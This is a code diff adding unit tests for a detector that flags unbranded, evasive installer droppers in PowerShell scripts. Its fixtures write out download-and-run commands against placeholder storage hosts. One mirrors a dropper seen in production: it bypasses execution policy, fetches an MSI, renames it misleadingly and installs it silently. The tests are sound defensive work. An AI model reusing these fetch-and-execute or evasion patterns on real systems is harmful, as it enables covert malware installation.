@@ -220,6 +220,98 @@ describe('computeScriptSignals — negatives (must not reach alert)', () => {
   });
 });
 
+describe('computeScriptSignals — unbranded installer gate', () => {
+  const unbrandedSignal = (signals: ComputedSignal[], partnerId = 'partner-fixture-a') =>
+    signals.find((s) => s.signalKey === 'rmm.unbranded_installer' && s.partnerId === partnerId);
+
+  // Shape (not the literal payload) of the dropper that evaded the branded
+  // gate in production: random-word bucket, random-word artifact, saved under
+  // a third unrelated name, and NOT ONE vendor token anywhere in the script.
+  const evasiveDropper = [
+    'powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest',
+    "-Uri 'https://fixturewordsalad.s3.eu-west-2.amazonaws.com/aaaa/quuxbaz.msi'",
+    '-OutFile C:\\WINDOWS\\TEMP\\zzfixture.msi;',
+    "Start-Process msiexec -ArgumentList '/i','C:\\WINDOWS\\TEMP\\zzfixture.msi','/quiet','/norestart' -Wait\"",
+  ].join(' ');
+
+  it('gates a vendor-less object-storage dropper the branded gate cannot see', () => {
+    const f = finding({ scriptContent: evasiveDropper });
+    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
+
+    // The whole point: the branded detector stays silent on this script.
+    expect(installerSignal(signals)).toBeUndefined();
+
+    const s = unbrandedSignal(signals);
+    expect(s).toBeDefined();
+    expect(s!.severity).toBe('alert');
+    expect(s!.evidence.markers).toContain('unrelated_host');
+    expect(s!.evidence.markers).toContain('misleading_filename');
+    expect(s!.evidence.markers).toContain('exec_policy_bypass');
+    expect(JSON.stringify(s!.evidence)).not.toContain('Invoke-WebRequest');
+  });
+
+  it("does not alert on a partner's own bucket serving a truthfully-named installer", () => {
+    const f = finding({
+      scriptContent: [
+        'Invoke-WebRequest -Uri "https://acmeit-deploy.s3.us-east-1.amazonaws.com/pkg/acmeagent.msi" -OutFile "acmeagent.msi"',
+        'msiexec /i acmeagent.msi /quiet',
+      ].join('\n'),
+    });
+    const s = unbrandedSignal(computeScriptSignals([f], noShared, cfg, noIndicators));
+    expect(s).toBeDefined();
+    expect(s!.severity).not.toBe('alert');
+    // Bucket label relates to the partner, and the saved name matches the source.
+    expect(s!.evidence.markers).not.toContain('unrelated_host');
+    expect(s!.evidence.markers).not.toContain('misleading_filename');
+  });
+
+  it('stays silent on an unbranded fetch that is not from object storage (documented limit)', () => {
+    const f = finding({
+      scriptContent:
+        'Invoke-WebRequest -Uri "https://unrelated-fixture.test/pkg/quuxbaz.msi" -OutFile "zzfixture.msi"; msiexec /i zzfixture.msi /quiet',
+    });
+    const signals = computeScriptSignals([f], noShared, cfg, noIndicators);
+    expect(unbrandedSignal(signals)).toBeUndefined();
+    expect(installerSignal(signals)).toBeUndefined();
+  });
+
+  it('prefers the branded key when a product IS named, and can emit both gates', () => {
+    const branded = finding({
+      scriptId: 'script-fixture-branded',
+      scriptContent:
+        'Invoke-WebRequest -Uri "https://fixturebucket.s3.amazonaws.com/anydesk.msi" -OutFile "anydesk.msi"; msiexec /i anydesk.msi /qn',
+    });
+    const unbranded = finding({ scriptId: 'script-fixture-unbranded', scriptContent: evasiveDropper });
+    const signals = computeScriptSignals([branded, unbranded], noShared, cfg, noIndicators);
+    expect(installerSignal(signals)).toBeDefined();
+    expect(unbrandedSignal(signals)).toBeDefined();
+  });
+});
+
+describe('misleading_filename compares the saved name against the SOURCE name', () => {
+  it('does not fire when the saved name matches the fetched filename', () => {
+    const f = finding({
+      scriptContent:
+        'Invoke-WebRequest -Uri "https://fixturebucket.s3.amazonaws.com/pkg/sophos.msi" -OutFile "sophos.msi"; msiexec /i sophos.msi /quiet',
+    });
+    const s = computeScriptSignals([f], noShared, cfg, noIndicators).find(
+      (x) => x.signalKey === 'rmm.unbranded_installer',
+    );
+    expect(s!.evidence.markers).not.toContain('misleading_filename');
+  });
+
+  it('fires when the saved name is unrelated to the fetched filename', () => {
+    const f = finding({
+      scriptContent:
+        'Invoke-WebRequest -Uri "https://fixturebucket.s3.amazonaws.com/pkg/quuxbaz.msi" -OutFile "PhotoViewer.msi"; msiexec /i PhotoViewer.msi /quiet',
+    });
+    const s = computeScriptSignals([f], noShared, cfg, noIndicators).find(
+      (x) => x.signalKey === 'rmm.unbranded_installer',
+    );
+    expect(s!.evidence.markers).toContain('misleading_filename');
+  });
+});
+
 describe('extractHosts', () => {
   it('extracts lowercased authorities (with port) and strips userinfo and trailing punctuation', () => {
     const hosts = extractHosts(
